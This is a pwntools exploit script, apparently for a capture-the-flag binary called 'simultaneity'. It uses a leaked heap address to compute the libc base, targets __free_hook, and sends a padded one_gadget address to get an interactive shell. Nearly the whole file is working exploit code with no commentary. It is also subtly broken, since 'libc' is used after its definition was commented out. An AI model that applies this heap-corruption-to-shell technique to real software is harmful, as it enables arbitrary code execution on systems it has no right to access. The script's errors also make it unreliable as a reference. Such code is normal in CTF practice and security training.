from pwn import *
context.log_level='debug'
context.terminal=['tmux','sp','-h']

binary = context.binary = ELF('./simultaneity')

# p = process(binary.path)
# elf = ELF(binary.path)
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = process(["./ld-linux-x86-64.so.2", "./simultaneity"], env={"LD_PRELOAD":"./libc.so.6"})

p.sendlineafter("big?\n",str(10000000))
p.recvuntil('here: ')
heap_addr = int(p.recvline().strip(),16)
libc.address = heap_addr-(0x7f8458780010-0x7f845910a000)
log.info('libc.address: ' + hex(libc.address))
log.info('libc.sym.__free_hook: ' + hex(libc.sym.__free_hook))

gdb.attach(p,"b *$rebase(0x125C)")

p.sendlineafter("far?\n",str(0))
# p.sendlineafter("far?\n",str((libc.sym.__free_hook - heap_addr)//8))
# p.sendlineafter("what?\n",str(libc.address+0xe6c7e))
p.sendlineafter("what?\n",0x500*"0"+str(libc.address+0xe6c84))






p.interactive()